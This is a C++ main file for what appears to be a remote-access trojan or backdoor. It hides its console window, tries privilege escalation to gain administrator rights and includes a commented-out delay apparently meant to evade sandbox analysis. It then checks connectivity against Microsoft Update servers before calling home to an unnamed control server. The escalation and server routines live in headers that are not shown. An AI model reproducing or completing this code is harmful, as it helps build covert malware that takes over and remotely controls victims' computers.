#include <iostream>
#include <time.h>

#include "MicrosoftUpdate.h"
#include "ServerConnection.h"
#include "System.h"
#include "PrivilegeEscalation.h"

#pragma comment(lib, "Ws2_32.lib")


int main(int argc, char** argv)
{
	// Hide the CMD prompt window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	// System Properties Configuration
	System::setArguments(argc, argv);
	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());

	// Privilege Escalation
	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
	{
		if (PrivilegeEscalation::run())
		{
			exit(0);
		}
	}

	ShowWindow(hWnd, SW_SHOW);
	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
	if (System::getIsSystemAdmin())
	{
		system("net session");
		std::cout << "Running as an Administrator!" << std::endl;
	}

	// TODO: Maintaining (next sprint)

connection:
	std::cout << "LOG: waiting..." << std::endl;
	// Wait 3 Minutes for Security Reasons
	//Sleep(180000); -> REMOVE COMMENT BEFORE PRODUCTION

	//Connect to Microsoft Update Servers for Internet Check
	if (!MicrosoftUpdate::run())
	{
		goto connection;
	}

	//Connect to Server
	ServerConnection::run();

	system("PAUSE");
	return 0;
}